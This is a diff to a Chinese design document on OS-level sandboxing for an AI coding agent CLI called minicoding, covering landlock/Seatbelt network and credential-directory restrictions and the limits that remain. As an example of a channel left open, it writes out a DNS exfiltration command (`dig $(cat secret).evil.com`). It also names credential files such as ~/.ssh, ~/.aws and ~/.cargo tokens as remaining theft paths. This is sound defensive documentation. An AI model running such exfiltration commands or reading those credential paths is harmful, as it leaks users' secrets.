@@ -383,7 +383,7 @@ minicoding audit stats          # 工具调用频次、拒绝率
 
 ## 8. 操作系统级沙箱（一等公民，参考 Codex）
 
-> **实现状态核对（2026-08-23 遗留#1 落地后更新）**：Linux landlock ABI≥4 与 macOS Seatbelt 已实现 ReadOnly/WorkspaceWrite 下子进程**默认禁 TCP/UDP**（web.fetch 等主进程工具不受影响）；Windows Job Object 无网络过滤原语，该平台仍不限网络（`is_hardened()=false` 如实上报）。需子进程联网时使用 external-sandbox/danger-full-access。
+> **实现状态核对（2026-08-28 R5 收尾更新）**：Linux landlock ABI≥4 已实现 ReadOnly/WorkspaceWrite 下子进程**默认禁 TCP**（bind/connect）；macOS Seatbelt 同策略且追加凭证目录读白名单（SEC-4 修复，`~/.ssh`/`~/.aws` 等不可读）。**诚实边界**：landlock ABI4 网络原语仅覆盖 TCP——UDP/DNS/ICMP 不受限（`dig $(cat secret).evil.com` 通道），`--features seccomp` 启用时经参数化规则封堵 `socket(AF_INET/AF_INET6)`（SEC-8，2026-08-28 落地），默认构建下该通道保留并由应用层 web 工具 IP pinning 兜底。Windows Job Object 无网络过滤原语，该平台仍不限网络（`is_hardened()=false` 如实上报）。需子进程联网时使用 external-sandbox/danger-full-access。
 
 > **设计变更**：原先沙箱被列为"后续可选/非硬隔离"。参考 OpenAI Codex CLI（`codex-rs`）的实践——Rust 完全可以在主流平台实现**内核级硬隔离**——本项目将 OS 沙箱升级为一等公民，作为应用层权限（§2/§3）之外的**第二道防线**。两道防线独立：即使应用层策略被绕过或误配，沙箱仍能在内核级阻止越界写/网络外联/危险系统调用。
 >
@@ -505,8 +505,8 @@ shell.run / fs.write 执行
 |------|------|-----------|
 | Linux | `errno=EPERM`；seccomp `Bad system call`/`SIGSYS` | `syscall_blocked` |
 | Linux | `EACCES`；Landlock `denied` 关键字 | `write_forbidden` |
-| macOS | `Sandbox violation` | `write_forbidden` |
-| macOS | `sandbox-exec` 启动失败 | `external` |
+| macOS | `sandbox_init failed`（Seatbelt 注入失败，2026-08-26 修正；`sandbox-exec`/`Sandbox violation` 文案不可达） | `setup_failure` |
+| macOS | 拒绝典型表现为 `Operation not permitted`（EPERM，通用签名 advisory + 结构化 errno 权威判定） | `write_forbidden` |
 | Windows | `Access is denied`（5） | `write_forbidden` |
 | Windows | `privilege not held`（1314） | `external` |
 
@@ -618,9 +618,16 @@ CI 与发行包构建的零外部依赖承诺。开启后同一 `pre_exec` 胶�
 `~/.volta`、`~/.npm`、`~/go`、`$GOPATH`。landlock 未列入规则的路径连读都拒绝；
 生效集经 `tracing::info` 打印（可观测、可审计）。
 
-- 凭证目录（`.ssh`/`.aws` 等）不在白名单内，**不可读**——刻意不含 `$HOME` 本身；
+- 凭证目录（`.ssh`/`.aws`/`.gnupg`）不在白名单内，**不可读**——刻意不含 `$HOME` 本身；
+- **诚实边界（SEC-11，2026-08-28 R5 收尾）**：白名单内 `~/.config`（gh/gcloud 凭证落点）、
+  `~/.cargo`（crates.io `credentials` 令牌）等**仍属低概率凭证通道**——"凭证目录不可读"
+  是强声明，实际为"`$HOME` 不整体放行 + 高概率凭证目录不在白名单"。macOS Seatbelt
+  侧以 profile 尾部显式 deny 覆盖白名单内高危落点（`credential_dir_deny_paths`）；
+  Linux landlock 侧依赖 ABI 5+ deny 规则优先级（当前 landlock crate 版本未暴露，
+  残留通道由应用层 `fs.read` 敏感文件清单兜底，见 `minicoding-tools` fs::read
+  `SENSITIVE_FILE_NAMES`）；
 - 代价是白名单外的私有工具链在沙箱内不可见，此类场景走 `external-sandbox`
-  兜底（声明依赖外层隔离，§8.1）；macOS Seatbelt / Windows 无此变更（各自独立语义）。
+  兜底（声明依赖外层隔离，§8.1）；macOS Seatbelt 同款白名单 + 尾部 deny。
 
 ### 8.13 沙箱拒绝权威/advisory 双轨判定（A4，2026-08-25 R2 批次）
 
